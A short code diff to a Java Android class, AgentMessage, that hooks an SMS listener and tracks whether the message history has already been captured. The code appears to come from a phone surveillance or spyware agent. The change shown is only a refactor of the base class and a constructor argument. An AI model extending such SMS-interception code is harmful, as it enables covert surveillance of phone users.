@@ -37,7 +37,7 @@ import com.android.service.util.WChar;
  * @author zeno -> Ahahah ti piacerebbe eh?? :>
  * @real-author Que, r0x
  */
-public class AgentMessage extends AgentBase implements Observer<Sms> {
+public class AgentMessage extends BaseAgent implements Observer<Sms> {
 	private static final String TAG = "AgentMessage"; //$NON-NLS-1$
 	//$NON-NLS-1$
 	private static final int SMS_VERSION = 2010050501;
@@ -48,7 +48,7 @@ public class AgentMessage extends AgentBase implements Observer<Sms> {
 	public void begin() {
 		ListenerSms.self().attach(this);
 
-		final Markup storedImsi = new Markup(getType());
+		final Markup storedImsi = new Markup(this);
 
 		// Abbiamo gia' catturato lo storico
 		if (storedImsi.isMarkup() == false) {
